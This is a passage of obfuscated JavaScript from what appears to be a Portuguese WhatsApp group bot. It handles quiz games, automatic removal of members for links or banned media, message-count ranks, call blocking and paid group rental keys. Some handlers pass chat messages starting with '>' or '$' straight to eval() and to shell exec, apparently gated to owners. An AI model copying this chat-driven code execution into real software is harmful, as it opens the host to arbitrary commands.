                fs.writeFileSync("./DADOS/usuarios/grupos/games/quiz-animais/" + _0x4f1071 + ".json", "" + JSON.stringify(quizanimais[Math.floor(Math.random() * quizanimais.length)]));
                let _0x666278 = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/quiz-animais/" + _0x4f1071 + ".json"));
                imagemtexto = "🤔 Qual é o animal apresentado na imagem?\n • Envie sua resposta abaixo, mencionando esta mensagem.";
                wew = await getBuffer("" + _0x666278.foto);
                const _0x3d3993 = {
                  image: wew,
                  caption: imagemtexto,
                  thumbnail: wew
                };
                const _0x22bf90 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x3d3993, _0x22bf90);
              }, 5000);
            }
          }
          if (_0xd20756 && fs.existsSync("./DADOS/usuarios/grupos/games/gartic/" + _0x4f1071 + ".json")) {
            let _0x4b8d6a = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/gartic/" + _0x4f1071 + ".json"));
            if (_0xf87dd3.slice(0, 4).toUpperCase() == _0x4b8d6a.resposta.slice(0, 4).toUpperCase() && _0xf87dd3.toUpperCase() != _0x4b8d6a.resposta) {
              return _0x403602("Está perto!");
            }
            if (_0xf87dd3.toUpperCase() == _0x4b8d6a.resposta) {
              const _0x5410fa = {
                text: "*DESCOBERTO!* Parabéns " + _0x55a6ac + ", iniciando o próximo jogo em 5 segundos."
              };
              const _0x3bf08d = {
                mentionedJid: [_0x32e455]
              };
              _0x263319.sendMessage(_0x4f1071, _0x5410fa, _0x3bf08d);
              fs.unlinkSync("./DADOS/usuarios/grupos/games/gartic/" + _0x4f1071 + ".json");
              setTimeout(async () => {
                fs.writeFileSync("./DADOS/usuarios/grupos/games/gartic/" + _0x4f1071 + ".json", "" + JSON.stringify(garticArchives[Math.floor(Math.random() * garticArchives.length)]));
                let _0x16a4a4 = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/gartic/" + _0x4f1071 + ".json"));
                garticText = "👩🏼‍🏫 - A resposta é representada por um(a): " + _0x16a4a4.pergunta + "\n📜 - A resposta supostamente começa com a(s) letra(s): \"" + _0x16a4a4.letra_inicial + "\"\n🤔 - Hmmm, contém traços? " + _0x16a4a4.contem_traços + "\n–\n❓️ - *Não sabe a resposta?* _Peça ao adm do grupo para usar o comando *" + _0x1d93be + "revelargartic* para revelar a resposta correta da afirmação._";
                wew = await getBuffer("" + _0x16a4a4.imagem);
                const _0x4d1833 = {
                  image: wew,
                  caption: garticText,
                  thumbnail: wew
                };
                const _0xa74943 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x4d1833, _0xa74943);
              }, 5000);
            }
          }
          if (_0xd20756 && fs.existsSync("./DADOS/usuarios/grupos/games/enigma/" + _0x4f1071 + ".json")) {
            let _0x4c9ba5 = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/enigma/" + _0x4f1071 + ".json"));
            if (_0xf87dd3.slice(0, 4).toUpperCase() == _0x4c9ba5.respostaEne.slice(0, 4).toUpperCase() && _0xf87dd3.toUpperCase() != _0x4c9ba5.respostaEne) {
              return _0x403602("Está perto!");
            }
            if (_0xf87dd3.toUpperCase() == _0x4c9ba5.respostaEne) {
              const _0x428ee5 = {
                text: "*ENIGMA RESOLVIDO!* Parabéns " + _0x55a6ac + ", iniciando o próximo jogo em 5 segundos."
              };
              const _0x4c53e1 = {
                mentionedJid: [_0x32e455]
              };
              _0x263319.sendMessage(_0x4f1071, _0x428ee5, _0x4c53e1);
              fs.unlinkSync("./DADOS/usuarios/grupos/games/enigma/" + _0x4f1071 + ".json");
              setTimeout(async () => {
                fs.writeFileSync("./DADOS/usuarios/grupos/games/enigma/" + _0x4f1071 + ".json", "" + JSON.stringify(enigmaArchive[Math.floor(Math.random() * enigmaArchive.length)]));
                let _0xa792d6 = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/enigma/" + _0x4f1071 + ".json"));
                enigmaTezt = "📜 - Resolva o seguinte enigma abaixo:\n–\n" + _0xa792d6.charada + "\n–\n❓️ - *Não sabe a resposta?* _Peça ao adm do grupo para usar o comando *" + _0x1d93be + "revelarenigma* para revelar a resposta correta da enigma._";
                wew = await getBuffer("https://telegra.ph/file/15be608763684b3e3af38.jpg");
                const _0xe8ab24 = {
                  image: wew,
                  caption: enigmaTezt,
                  thumbnail: wew
                };
                const _0xa1fb82 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0xe8ab24, _0xa1fb82);
              }, 5000);
            }
          }
          if (_0xd20756 && fs.existsSync("./DADOS/usuarios/grupos/games/wmusic/" + _0x4f1071 + ".json")) {
            whatMusic = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/wmusic/" + _0x4f1071 + ".json"));
            if (_0xf87dd3.slice(0, 4).toUpperCase() == whatMusic.resposta.slice(0, 4).toUpperCase() && _0xf87dd3.toUpperCase() != whatMusic.resposta) {
              return _0x403602("Tá perto hein! Tente novamente...");
            }
            if (_0xf87dd3.toUpperCase() == whatMusic.resposta) {
              const _0x3d5845 = {
                text: "• Resposta Correta: *" + whatMusic.resposta + "*\nParabéns " + _0x55a6ac + ", iniciando o próximo jogo em 5 segundos."
              };
              const _0x4ed022 = {
                mentionedJid: [_0x32e455]
              };
              _0x263319.sendMessage(_0x4f1071, _0x3d5845, _0x4ed022);
              fs.unlinkSync("./DADOS/usuarios/grupos/games/wmusic/" + _0x4f1071 + ".json");
              setTimeout(async () => {
                fs.writeFileSync("./DADOS/usuarios/grupos/games/wmusic/" + _0x4f1071 + ".json", "" + JSON.stringify(whatMusicAr[Math.floor(Math.random() * whatMusicAr.length)]));
                wmusic = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/wmusic/" + _0x4f1071 + ".json"));
                textM = "🎶🎧 𝐖𝐇𝐀𝐓 𝐌𝐔𝐒𝐈𝐂? 😱💡\n–\n" + wmusic.trechoMusic + "\n–\n🤔😱 Qual música pertence o trecho apresentado acima?\n• " + II + "Dica:" + II + " " + wmusic.dica;
                const _0x413ea4 = {
                  text: textM
                };
                const _0x3f5721 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x413ea4, _0x3f5721);
              }, 5000);
            }
          }
          function _0x49a809(_0x3244db, _0x370d84) {
            var _0x5793b1 = 0;
            [..._0x3244db].forEach(_0x20cbea => {
              if (_0x20cbea === _0x370d84) {
                _0x5793b1++;
              }
            });
            return _0x5793b1;
          }
          _0x3c41aa();
          var _0x4897be = [];
          for (let _0x1d169d of mines) {
            _0x4897be.push(_0x1d169d.id);
          }
          const _0x1928c8 = (await mines.find(_0x1045d6 => _0x1045d6.id == _0x4f1071)) ? true : false;
          var _0x20193e = ["a1", "a2", "a3", "a4", "a5", "b1", "b2", "b3", "b4", "b5", "c1", "c2", "c3", "c4", "c5", "d1", "d2", "d3", "d4", "d5", "e1", "e2", "e3", "e4", "e5"];
          if (_0x44ddae && _0xd20756 && _0x5550bd && !_0x150e9e && !_0x35021e) {
            if (_0x2c281f.includes("chat.whatsapp.com/")) {
              if (_0x3663a1) {
                return;
              }
              link_dgp = await _0x263319.groupInviteCode(_0x4f1071);
              if (_0x2c281f.match(link_dgp)) {
                return _0x403602("Link do nosso grupo, não irei remover.. ");
              }
              if (_0x326231) {
                setTimeout(() => {
                  _0x263319.sendMessage(_0x4f1071, {
                    delete: {
                      remoteJid: _0x4f1071,
                      fromMe: false,
                      id: _0x302296.key.id,
                      participant: _0x32e455
                    }
                  });
                }, 500);
              }
              if (!JSON.stringify(_0x5b3ba6).includes(_0x32e455)) {
                return;
              }
              _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
            }
          }
          const _0x154c95 = [];
          for (let _0x543f16 of countMessage) {
            _0x154c95.push(_0x543f16.groupId);
          }
          const _0xf5b6fe = [];
          for (let _0x393cc5 of muted) {
            _0xf5b6fe.push(_0x393cc5.jid);
          }
          const _0x444027 = _0xd20756 && _0xf5b6fe.indexOf(_0x4f1071) >= 0 ? true : false;
          const _0x4687a8 = _0x444027 ? muted[_0xf5b6fe.indexOf(_0x4f1071)].numbers : [];
          if (_0x444027 && _0x4687a8.indexOf(_0x32e455) >= 0) {
            setTimeout(async () => {
              _0x263319.sendMessage(_0x4f1071, {
                delete: {
                  remoteJid: _0x4f1071,
                  fromMe: false,
                  id: _0x302296.key.id,
                  participant: _0x32e455
                }
              });
            }, 1000);
            return;
          }
          if (_0x24bf3d && _0x5550bd && _0x51a818 == "requestPaymentMessage") {
            if (_0x302296.key.fromMe) {
              return;
            }
            const _0x4db5a2 = {
              quoted: _0x302296
            };
            if (_0x150e9e) {
              return _0x263319.sendMessage(_0x4f1071, {
                text: "🩰Mensagem proibida detectada, porém vc e adm eu num farei nada."
              }, _0x4db5a2);
            }
            if (_0x3bd584[0].legenda_documento != "0") {
              const _0x4293a2 = {
                text: _0x3bd584[0].legenda_documento
              };
              const _0x44515e = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x4293a2, _0x44515e);
            }
            if (_0x326231) {
              setTimeout(() => {
                _0x263319.sendMessage(_0x4f1071, {
                  delete: {
                    remoteJid: _0x4f1071,
                    fromMe: false,
                    id: _0x302296.key.id,
                    participant: _0x32e455
                  }
                });
              }, 500);
            }
            if (!JSON.stringify(_0x5b3ba6).includes(_0x32e455)) {
              return;
            }
            _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
          }
          var _0x2c5658 = [];
          if (_0xd20756 && _0x154c95.indexOf(_0x4f1071) >= 0) {
            var _0x981834 = _0x154c95.indexOf(_0x4f1071);
            for (let _0x4e2be6 of countMessage[_0x981834].numbers) {
              _0x2c5658.push(_0x4e2be6.id);
            }
            if (_0x2c5658.indexOf(_0x32e455) >= 0) {
              var _0x5682cd = _0x2c5658.indexOf(_0x32e455);
              var _0x3cad2c = countMessage[_0x981834].numbers[_0x5682cd];
              if (_0x51a818 !== "stickerMessage") {
                _0x3cad2c.messages += _0x52ab25 ? 0 : 1;
                _0x3cad2c.cmd_messages += _0x52ab25 ? 1 : 0;
                _0x3cad2c.aparelho = _0x5e33af;
              }
              if (_0x51a818 === "stickerMessage") {
                _0x3cad2c.figus += 1;
              }
              if (_0x3cad2c.nick !== _0x55a6ac) {
                _0x3cad2c.nick = _0x55a6ac;
              }
              fs.writeFileSync("./DADOS/countmsg.json", JSON.stringify(countMessage, null, 2) + "\n");
            } else {
              const _0x17d70b = _0x52ab25 ? 0 : 1;
              const _0x1e3415 = _0x52ab25 ? 1 : 0;
              var _0x28a953 = _0x51a818 === "stickerMessage" ? 1 : 0;
              const _0x641d6b = {
                id: _0x32e455,
                nick: _0x55a6ac,
                messages: _0x17d70b,
                cmd_messages: _0x1e3415,
                aparelho: _0x5e33af,
                figus: _0x28a953
              };
              countMessage[_0x981834].numbers.push(_0x641d6b);
              fs.writeFileSync("./DADOS/countmsg.json", JSON.stringify(countMessage, null, 2) + "\n");
            }
          } else if (_0xd20756) {
            countMessage.push({
              groupId: _0x4f1071,
              numbers: [{
                id: _0x32e455,
                nick: _0x55a6ac,
                messages: _0x51a818 !== "stickerMessage" ? 1 : 0,
                cmd_messages: _0x52ab25 ? 1 : 0,
                aparelho: _0x5e33af,
                figus: _0x51a818 === "stickerMessage" ? 1 : 0
              }]
            });
            fs.writeFileSync("./DADOS/countmsg.json", JSON.stringify(countMessage, null, 2) + "\n");
          }
          if (_0xf87dd3.startsWith(">")) {
            try {
              if (_0x302296.key.fromMe) {
                return;
              }
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818 && !_0x335a29 && !_0x594818) {
                return;
              }
              console.log("[", colors.cyan("EVAL"), "]", colors.yellow(moment(_0x302296.messageTimestamp * 1000).format("DD/MM HH:mm:ss")), colors.green(_0xf87dd3));
              return _0x263319.sendMessage(_0x4f1071, {
                text: JSON.stringify(eval(_0xf87dd3.slice(2)), null, "\t")
              }).catch(_0x1dc1fd => {
                return _0x403602(String(_0x1dc1fd));
              });
            } catch (_0x2fbd69) {
              return _0x403602(String(_0x2fbd69));
            }
          }
          if (_0xf87dd3.startsWith("(>")) {
            try {
              if (_0x302296.key.fromMe) {
                return;
              }
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818 && !_0x335a29 && !_0x594818) {
                return;
              }
              var _0x1207fa = _0xf87dd3.slice(3);
              Return = _0x4cb38d => {
                var _0x1076bd = JSON.stringify(_0x4cb38d, null, 2);
                bang = util.format(_0x1076bd);
                if (_0x1076bd == undefined) {
                  bang = util.format(_0x4cb38d);
                }
                const _0x770c4e = {
                  text: bang
                };
                const _0x2508a2 = {
                  quoted: _0x302296
                };
                return _0x263319.sendMessage(_0x4f1071, _0x770c4e, _0x2508a2);
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: util.format(eval(";(async () => { " + _0x1207fa + " })()"))
              }).catch(_0x4a28b7 => {
                return _0x403602(String(_0x4a28b7));
              });
              console.log("[1;37m>", "[", "[1;32mEXEC[1;37m", "]", time, colors.green(">"), "from", colors.green(_0x32e455.split("@")[0]), "args :", colors.green(_0x40e45c.length));
            } catch (_0x2593e0) {
              return _0x403602(String(_0x2593e0));
              console.log(_0x2593e0);
            }
          }
          if (_0x2e320b.startsWith("$")) {
            if (_0x302296.key.fromMe) {
              return;
            }
            if (!_0x2a5ff3 && !_0x35021e) {
              return;
            }
            exec(_0x1d6557, (_0x239fdb, _0x3fcb7e) => {
              if (_0x239fdb) {
                return _0x403602("" + _0x239fdb);
              }
              if (_0x3fcb7e) {
                _0x403602(_0x3fcb7e);
              }
            });
          }
          if (_0x416e68 && _0x5550bd && _0x51a818 == "imageMessage") {
            if (_0x302296.key.fromMe) {
              return;
            }
            const _0xa8cf0d = {
              quoted: _0x302296
            };
            if (_0x150e9e) {
              return _0x263319.sendMessage(_0x4f1071, {
                text: "*mensagem proibida detectada, porém é admin logo a punição será anulada*"
              }, _0xa8cf0d);
            }
            if (_0x3bd584[0].legenda_imagem != "0") {
              const _0x15cd40 = {
                text: _0x3bd584[0].legenda_imagem
              };
              const _0x359885 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x15cd40, _0x359885);
            }
            if (_0x326231) {
              setTimeout(() => {
                _0x263319.sendMessage(_0x4f1071, {
                  delete: {
                    remoteJid: _0x4f1071,
                    fromMe: false,
                    id: _0x302296.key.id,
                    participant: _0x32e455
                  }
                });
              }, 500);
            }
            if (!JSON.stringify(_0x5b3ba6).includes(_0x32e455)) {
              return;
            }
            _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
          }
          if (_0x4233ab && _0x5550bd && _0x51a818 == "stickerMessage") {
            if (_0x302296.key.fromMe) {
              return;
            }
            const _0x1c11c6 = {
              quoted: _0x302296
            };
            if (_0x150e9e) {
              return _0x263319.sendMessage(_0x4f1071, {
                text: "*mensagem proibida detectada, porém é admin logo a punição será anulada*"
              }, _0x1c11c6);
            }
            const _0xa4ac43 = {
              quoted: _0x302296
            };
            _0x263319.sendMessage(_0x4f1071, {
              text: "*mensagem proibida detectada, banindo...*"
            }, _0xa4ac43);
            if (_0x326231) {
              setTimeout(() => {
                _0x263319.sendMessage(_0x4f1071, {
                  delete: {
                    remoteJid: _0x4f1071,
                    fromMe: false,
                    id: _0x302296.key.id,
                    participant: _0x32e455
                  }
                });
              }, 500);
            }
            if (!JSON.stringify(_0x5b3ba6).includes(_0x32e455)) {
              return;
            }
            _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
          }
          if (_0x367ec0 && _0x5550bd && _0x51a818 == "documentMessage") {
            if (_0x302296.key.fromMe) {
              return;
            }
            const _0x376e30 = {
              quoted: _0x302296
            };
            if (_0x150e9e) {
              return _0x263319.sendMessage(_0x4f1071, {
                text: "*mensagem proibida detectada, porém é admin logo a punição será anulada*"
              }, _0x376e30);
            }
            if (_0x3bd584[0].legenda_documento != "0") {
              const _0x82f384 = {
                text: _0x3bd584[0].legenda_documento
              };
              const _0x2dea44 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x82f384, _0x2dea44);
            }
            if (_0x326231) {
              setTimeout(() => {
                _0x263319.sendMessage(_0x4f1071, {
                  delete: {
                    remoteJid: _0x4f1071,
                    fromMe: false,
                    id: _0x302296.key.id,
                    participant: _0x32e455
                  }
                });
              }, 500);
            }
            if (!JSON.stringify(_0x5b3ba6).includes(_0x32e455)) {
              return;
            }
            _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
          }
          let _0x3385b2 = Array("tiktok", "facebook", "instagram", "twitter", "ytmp3", "ytmp4", "play", "play_audio", "play_video", "play").some(_0x47121a => _0x47121a === _0x3dec88);
          if (_0x4eac7e(_0x2a2fa4) && _0x51b3b7 && !_0x150e9e && !_0x35021e && _0x5550bd) {
            if (_0x2c281f.includes("chat.whatsapp.com")) {
              link_dgp = await _0x263319.groupInviteCode(_0x4f1071);
              if (_0x2c281f.match(link_dgp)) {
                return _0x403602("Link do nosso grupo, não irei remover.. ");
              }
            }
            if (_0x52ab25 && _0x3385b2) {
              return;
            }
            if (_0x326231) {
              setTimeout(() => {
                _0x263319.sendMessage(_0x4f1071, {
                  delete: {
                    remoteJid: _0x4f1071,
                    fromMe: false,
                    id: _0x302296.key.id,
                    participant: _0x32e455
                  }
                });
              }, 500);
            }
            _0x263319.groupSettingUpdate(_0x4f1071, "announcement");
            setTimeout(() => {
              _0x263319.groupSettingUpdate(_0x4f1071, "not_announcement");
            }, 1200);
            _0x403602("Link aqui não -_-");
            if (!JSON.stringify(_0x5b3ba6).includes(_0x32e455)) {
              return;
            }
            _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
          }
          if (_0x4994fc && _0x3ad850.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi) && _0x5550bd && !_0x150e9e && !_0x35021e && !_0x2a5ff3 && !_0x302296.message?.reactionMessage?.text && _0x3ad850.length > 20) {
            let _0x511d16 = _0x3ad850.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi);
            if (_0x511d16 && _0xf87dd3.length < 100) {
              return;
            }
            if (_0x326231) {
              setTimeout(() => {
                _0x263319.sendMessage(_0x4f1071, {
                  delete: {
                    remoteJid: _0x4f1071,
                    fromMe: false,
                    id: _0x302296.key.id,
                    participant: _0x32e455
                  }
                });
              }, 500);
            }
            if (!JSON.stringify(_0x5b3ba6).includes(_0x32e455)) {
              return;
            }
            _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
          }
          if (_0x53df47 && _0x5550bd && _0x51a818 == "videoMessage") {
            const _0x256329 = {
              quoted: _0x302296
            };
            if (_0x150e9e) {
              return _0x263319.sendMessage(_0x4f1071, {
                text: "*mensagem proibida detectada, porém é admin logo a punição será anulada*"
              }, _0x256329);
            }
            if (_0x3bd584[0].legenda_video == "0") {
              const _0x1c96c9 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: "*mensagem proibida detectada, banindo...*"
              }, _0x1c96c9);
            } else {
              const _0x4d8041 = {
                text: _0x3bd584[0].legenda_video
              };
              const _0x283fa4 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x4d8041, _0x283fa4);
            }
            if (_0x326231) {
              setTimeout(() => {
                _0x263319.sendMessage(_0x4f1071, {
                  delete: {
                    remoteJid: _0x4f1071,
                    fromMe: false,
                    id: _0x302296.key.id,
                    participant: _0x32e455
                  }
                });
              }, 500);
            }
            if (!JSON.stringify(_0x5b3ba6).includes(_0x32e455)) {
              return;
            }
            _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
          }
          if (_0xb6a765 && _0x5550bd && _0x51a818 == "audioMessage") {
            const _0x4cf5df = {
              quoted: _0x302296
            };
            if (_0x150e9e) {
              return _0x263319.sendMessage(_0x4f1071, {
                text: "*mensagem proibida detectada, porém é admin logo a punição será anulada*"
              }, _0x4cf5df);
            }
            const _0x40be30 = {
              quoted: _0x302296
            };
            _0x263319.sendMessage(_0x4f1071, {
              text: "*mensagem proibida detectada, banindo...*"
            }, _0x40be30);
            if (_0x326231) {
              setTimeout(() => {
                _0x263319.sendMessage(_0x4f1071, {
                  delete: {
                    remoteJid: _0x4f1071,
                    fromMe: false,
                    id: _0x302296.key.id,
                    participant: _0x32e455
                  }
                });
              }, 500);
            }
            if (!JSON.stringify(_0x5b3ba6).includes(_0x32e455)) {
              return;
            }
            _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
          }
          if (_0x2cc1b9 && _0x5550bd) {
            if (_0x51a818 === "imageMessage") {
              buff = await getFileBuffer(_0x302296.message.imageMessage, "image");
              ran = getRandom("." + (await getExtension(_0x302296.message.imageMessage.mimetype)));
              fs.writeFileSync(ran, buff);
              res = await upload(buff);
              anu = await fetchJson(SITE_JEFF_APIS + "/api/antiporno?link=" + res + "&apikey=" + _0x512d5e);
              fs.unlinkSync(ran, buff);
              if (anu.resultado[0].className === "Porn" && anu.resultado[0].probability >= "0.723584315776825" && _0x150e9e) {
                const _0x3a43d4 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, {
                  text: "Você é adm, não banirei você por isto.."
                }, _0x3a43d4);
                fs.unlinkSync(ran, buff);
                return;
              } else if (anu.resultado[0].className === "Sexy" && anu.resultado[0].probability >= "0.28157779574394226" && !_0x150e9e && !_0x35021e) {
                const _0x324991 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, {
                  text: "hummm🧐"
                }, _0x324991);
                fs.unlinkSync(ran, buff);
                return;
              }
              if (anu.resultado[0].className === "Hentai" && _0x150e9e) {
                const _0xbf5545 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, {
                  text: "Você é adm, não banirei você..."
                }, _0xbf5545);
                fs.unlinkSync(ran, buff);
                return;
              } else if (anu.resultado[0].className === "Hentai" && !_0x150e9e && !_0x35021e) {
                const _0x5828fd = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, {
                  text: "PORNO DETECTADO, VOCÊ SERÁ BANIDO.."
                }, _0x5828fd);
                setTimeout(async function () {
                  if (!JSON.stringify(_0x5b3ba6).includes(_0x32e455)) {
                    return;
                  }
                  _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
                  fs.unlinkSync(ran, buff);
                }, 2000);
                return;
              }
            }
          }
          var _0x5cfb2b = Array("buyvip", "lojavip", "lojapremium", "vip-1d", "vip-5d", "vip-1s", "vip-2s", "vip-1m", "vip-2m", "vip-3m", "vip-perma", "menu", "menupremium", "menuvip", "dono", "infovip").some(_0xe75fe2 => _0xe75fe2 === _0x3dec88);
          if (!_0xd20756 && !_0x38b1b5 && _0x52ab25 && !_0x35021e && !_0x335a29 && !_0x594818 && !_0x5cfb2b && _0x5346a2 == true) {
            return _0x403602("Olá " + _0x55a6ac + ", o meu privado agora é bloqueado apenas para usuários Vip's!\nAdquira o acesso privado e Comandos exclusivos\ndigitando: " + _0x1d93be + "lojavip");
          }
          var _0xdb2526 = [];
          if (_0x2129b6 && !_0xdb2526.includes(_0x32e455)) {
            if (!_0xd20756 && !_0x2a5ff3 && !_0x35021e && !_0x38b1b5 && !_0x5cfb2b) {
              await sleep(2500);
              _0x403602(msgantipv1.replace("#nome#", _0x55a6ac));
              setTimeout(async () => {
                _0x263319.updateBlockStatus(_0x32e455, "block");
              }, 2000);
            }
            _0xdb2526.push(_0x32e455);
          }
          if (!_0xd20756 && !_0x38b1b5 && !_0x2a5ff3 && _0x2ae91c && !_0x5cfb2b) {
            return;
          }
          {
            var _0x487f9c = moment.tz("America/Sao_Paulo").format("HH:mm");
            var _0x21b61e = moment.tz("America/Sao_Paulo").format("mm");
            for (_0xc3d45a of black_) {
              if (_0xc3d45a.hora == _0x487f9c) {
                var _0x4f6549 = true;
              } else {
                var _0x4f6549 = false;
              }
            }
            if (_0x4f6549 == true) {
              for (_0xc3d45a of black_) {
                if (_0xc3d45a.hora == _0x487f9c) {
                  var _0x820ef = _0xc3d45a;
                }
              }
              for (_0xc3d45a of _0x820ef?.PUXAR) {
                if (_0xc3d45a.avisou == true) {
                  return;
                }
                if (_0xc3d45a.length == 0) {
                  return;
                }
                _0x263319.sendMessage(_0xc3d45a.idgp, {
                  text: _0xc3d45a.msg
                });
                _0xc3d45a.avisou = true;
                fs.writeFileSync("./DADOS/usuarios/grupos/AVISOS.json", JSON.stringify(black_, null, 2));
              }
            }
            ;
            for (_0xc3d45a of black_) {
              if (_0x21b61e >= _0xc3d45a.hora.split(":")[1] + parseInt(1)) {
                var _0x3e1c8a = _0xc3d45a;
                var _0x2f34e6 = true;
              } else {
                var _0x2f34e6 = false;
              }
            }
            ;
            if (_0x2f34e6 == true) {
              for (_0xc3d45a of _0x3e1c8a.PUXAR) {
                if (_0xc3d45a.avisou == true) {
                  _0xc3d45a.avisou = false;
                  fs.writeFileSync("./DADOS/usuarios/grupos/AVISOS.json", JSON.stringify(black_, null, 2));
                }
              }
            }
          }
          if (!_0xd20756 && _0x2ea32a) {
            _0x263319.ws.on("CB:call", async _0x3acba8 => {
              var _0x2c4aad = "./DADOS/call/msg_block-" + _0x32e455 + ".json";
              if (!fs.existsSync(_0x2c4aad)) {
                fs.writeFileSync(_0x2c4aad, JSON.stringify("_- PROGRAMAÇÃO DE - _\n\n BLOQUEAR / USUARIOS POR EFETUAR LIGAÇÃO PARA O BOT\n\n_- REALIZANDO AÇÃO _-", null, 2));
                var _0x5e3d88 = JSON.parse(fs.readFileSync(_0x2c4aad));
                if (_0x3acba8.content[0].tag == "offer") {
                  const _0x11223b = {
                    text: _0x5e3d88
                  };
                  _0x263319.sendMessage(_0x3acba8.content[0].attrs["call-creator"], _0x11223b).then(() => {
                    _0x263319.updateBlockStatus(_0x3acba8.content[0].attrs["call-creator"], "block");
                    DLT_FL(_0x2c4aad);
                  });
                }
              }
            });
          }
          let _0x40abb3 = Array("recarga", "recarregar", "buykeygp", "buygp", "me", "infoalugar", "loja", "lojavip", "lojapremium", "infovip", "alugar", "botentra", "planos").some(_0x4043c7 => _0x4043c7 === _0x3dec88);
          if (_0xd20756 && _0x2002ae && _0x52ab25 && !_0x2a5ff3 && !_0x40abb3) {
            if (!JSON.stringify(_0x565fa1).includes(_0x4f1071)) {
              const _0x5d8a84 = {
                id: _0x4f1071,
                limite: 5,
                validado: false
              };
              _0x565fa1.push(_0x5d8a84);
              fs.writeFileSync("./DADOS/aluguel/grupos.json", JSON.stringify(_0x565fa1, null, 2));
            }
            _0x3529b0 = _0x565fa1.map(_0xab7f1 => _0xab7f1.id).indexOf(_0x4f1071);
            if (_0x565fa1[_0x3529b0].validado == false) {
              if (_0x565fa1[_0x3529b0].limite <= 1) {
                _0x565fa1.splice(_0x3529b0, 1);
                fs.writeFileSync("./DADOS/aluguel/grupos.json", JSON.stringify(_0x565fa1, null, 2));
                _0x403602("☝️😔Visto que os senhores não se vêem interessados em adquirir uma key para ativar o aluguel, vou indo...");
                await sleep(3000);
                return _0x263319.groupLeave(_0x4f1071);
              } else {
                _0x565fa1[_0x3529b0].limite -= 1;
                fs.writeFileSync("./DADOS/aluguel/grupos.json", JSON.stringify(_0x565fa1, null, 2));
                return _0x403602("✋🤓 PAROU !! Não encontrei esse grupo em meus registros... Pfvr, caso o mesmo seja alugado, será necessário o uso de uma chave de acesso para ativar os comandos. Caso não tenha uma, podes comprar no comando " + _0x1d93be + "buykeygp");
              }
            }
          }
          var _0x92e1d6 = countMessage.map(_0x28a99e => _0x28a99e.groupId).indexOf(_0x4f1071);
          var _0x3a809d = _0x154c95.indexOf(_0x4f1071);
          var _0x18f60d = _0x2c5658?.indexOf(_0x32e455);
          if (_0xd20756 && JSON.stringify(countMessage).includes(_0x4f1071) && JSON.stringify(countMessage[_0x92e1d6]).includes(_0x32e455)) {
            try {
              var _0x2d77df = countMessage[_0x3a809d].numbers[_0x18f60d].messages;
            } catch {
              var _0x2d77df = 0;
            }
            var _0x39d39e = "Aspirante";
            var _0x5b6c65 = 0;
            if (_0x2d77df >= 0 && _0x2d77df < 20) {
              var _0x39d39e = "Aspirante";
              var _0x5b6c65 = 0;
            }
            ;
            if (_0x2d77df >= 20 && _0x2d77df < 50) {
              var _0x39d39e = "Recruta";
              var _0x5b6c65 = 1;
            }
            ;
            if (_0x2d77df >= 50 && _0x2d77df < 100) {
              var _0x39d39e = "Soldado";
              var _0x5b6c65 = 2;
            }
            ;
            if (_0x2d77df >= 100 && _0x2d77df < 200) {
              var _0x39d39e = "Cabo";
              var _0x5b6c65 = 3;
            }
            ;
            if (_0x2d77df >= 200 && _0x2d77df < 300) {
              var _0x39d39e = "Sargento";
              var _0x5b6c65 = 4;
            }
            ;
            if (_0x2d77df >= 300 && _0x2d77df < 400) {
              var _0x39d39e = "Sargento I";
              var _0x5b6c65 = 5;
            }
            ;
            if (_0x2d77df >= 400 && _0x2d77df < 500) {
              var _0x39d39e = "Sargento II";
              var _0x5b6c65 = 6;
            }
            ;
            if (_0x2d77df >= 500 && _0x2d77df < 600) {
              var _0x39d39e = "Sargento III";
              var _0x5b6c65 = 7;
            }
            ;
            if (_0x2d77df >= 600 && _0x2d77df < 700) {
              var _0x39d39e = "Sargento IV";
              var _0x5b6c65 = 8;
            }
            ;
            if (_0x2d77df >= 700 && _0x2d77df < 800) {
              var _0x39d39e = "Sargento V";
              var _0x5b6c65 = 9;
            }
            ;
            if (_0x2d77df >= 800 && _0x2d77df < 900) {
              var _0x39d39e = "Sargento VI";
              var _0x5b6c65 = 10;
